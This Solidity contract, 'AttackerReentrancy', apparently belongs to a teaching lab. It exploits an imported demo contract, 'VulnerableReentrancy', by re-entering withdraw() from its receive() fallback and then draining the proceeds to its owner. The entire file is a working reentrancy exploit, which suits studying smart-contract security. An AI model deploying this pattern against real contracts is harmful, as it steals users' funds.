// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "./VulnerableReentrancy.sol";

contract AttackerReentrancy {

    VulnerableReentrancy public target;
    address public owner;

    constructor(address _target) {
        target = VulnerableReentrancy(_target);
        owner  = msg.sender;
    }

    function attack() public payable {
        require(msg.value >= 1 ether, "Need 1 ETH to start");
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw();
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function drain() public {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}